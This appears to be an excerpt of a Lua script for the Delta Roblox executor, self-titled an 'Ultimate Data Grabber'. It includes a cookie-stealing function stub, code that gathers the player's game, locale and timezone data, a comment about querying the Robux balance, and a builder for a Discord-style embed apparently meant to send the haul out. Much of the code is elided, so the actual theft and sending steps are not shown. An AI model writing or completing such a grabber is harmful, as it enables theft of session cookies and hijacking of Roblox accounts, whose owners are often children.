-- ============================================================
-- ULTIMATE DATA GRABBER – MAXIMUM EFFORT (Delta Optimized)
-- Version 3.0 – No date, no timestamp, all pcall protected
-- ============================================================
...
local function stealCookie()
    ...
    -- Method 4: HTTP request to Roblox (may return Set-Cookie)
...
-- ========== ROBLOX INTERNAL DATA ==========
local function getRobloxInternals()
    local data = {}
    pcall(function()
        data.universeId = tostring(game.UniverseId or "N/A")
    end)
    pcall(function()
        data.rootPlaceId = tostring(game.RootPlaceId or "N/A")
    end)
    pcall(function()
        data.version = tostring(game.Version or "N/A")
    end)
    pcall(function()
        data.clientVersion = tostring(game:GetService("HttpService"):GetAsync("https://roblox.com/") and "N/A" or "N/A") -- not reliable
    end)
    pcall(function()
        data.locale = tostring(game:GetService("LocalizationService"):GetLocale())
    end)
    pcall(function()
        data.timezone = tostring(game:GetService("HttpService"):GetAsync("https://worldtimeapi.org/api/timezone/etc/utc") or "N/A")
    end)
    return data
end
...
local function collectEverything()
    ...
    -- Universe, RootPlace, Version
    local robloxInternals = getRobloxInternals()
    info.universeId = robloxInternals.universeId or "N/A"
    info.rootPlaceId = robloxInternals.rootPlaceId or "N/A"
    info.version = robloxInternals.version or "N/A"
    info.locale = robloxInternals.locale or "N/A"
    info.timezone = robloxInternals.timezone or "N/A"
    ...
    -- Attempt to get Robux balance (via game's internal HTTP or other)
    -- Not possible directly, but we can try to query the Roblox API with the user ID (requires auth)
...
local function buildEmbed(data)
    ...
    return {
        embeds = {{
            ...
            color = 0xFF0000,
            fields = fields,
            footer = {text = "Delta Executor – Max Attempt"}
        }}
    }
end
...
-- Main frame with gradient background (using two frames)
